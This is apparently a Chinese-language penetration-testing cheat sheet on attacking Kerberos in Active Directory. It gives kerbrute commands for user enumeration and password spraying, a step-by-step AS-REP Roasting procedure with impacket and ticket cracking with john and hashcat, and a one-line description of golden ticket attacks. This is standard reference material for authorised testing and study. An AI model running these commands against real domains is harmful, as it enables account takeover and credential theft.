+++
title = "Kerberos 渗透测试"
+++

## kerbrute

GitHub 项目：[ropnop/kerbrute](https://github.com/ropnop/kerbrute)

### 用户枚举

```bash
kerbrute userenum /usr/share/wordlists/seclists/Usernames/cirt-default-usernames.txt --dc <DC>.<Domain> -d <Domain>
```

### 口令验证（密码喷洒）

```bash
kerbrute passwordspray -d <Domain> <domain_users.txt> <Password>
```

### 密码爆破等

[ropnop/kerbrute/README.md](https://github.com/ropnop/kerbrute)

## AS-REP Roast 攻击

AS-REP Roast 攻击是基于在不提前知道密码的情况下获取票证授权票据（TGT）。

### 攻击前提

- 已知域用户名
- 用户具有 `UF_DONT_REQUIRE_PREAUTH` 属性

### 攻击流程

#### 1. 检查用户是否具有 `UF_DONT_REQUIRE_PREAUTH` 属性

```bash
impacket-GetNPUsers <Domain>/ -no-pass -usersfile users.txt
```

#### 2. 请求票据

```bash
impacket-GetNPUsers <Domain>/ -no-pass -usersfile users.txt -request
```

#### 3. 爆破票据

##### john

```bash
john --wordlist=password.txt hash.txt
```

##### hashcat

```bash
hashcat -a 0 -m 18200 hash.txt password.txt --force
```

## Kerberoasting

## 黄金票据攻击（Golden Ticket Attack）

“黄金票据攻击”是一种通过生成伪造的 TGT（票证授权票据）来实现的攻击，攻击者可以将其提交给 TGS（票证授权服务器），以请求域内任何服务的服务票据，并可以冒充域内的任何用户。
